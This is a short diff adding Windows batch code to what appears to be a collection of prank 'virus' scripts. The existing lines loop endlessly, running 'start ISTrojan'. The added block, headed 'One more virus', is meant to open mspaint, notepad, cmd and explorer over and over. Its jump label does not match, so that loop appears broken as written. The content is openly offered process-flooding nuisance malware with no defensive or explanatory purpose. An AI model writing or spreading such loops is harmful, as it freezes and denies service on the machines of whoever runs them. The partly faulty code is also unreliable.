@@ -3,3 +3,14 @@ md ISTrojan
 :A
 start  ISTrojan 
 goto A
+
+
+//One more virus
+
+@echo off 
+:xstart 
+mspaint
+start notepad 
+start cmd 
+start explorer 
+goto x
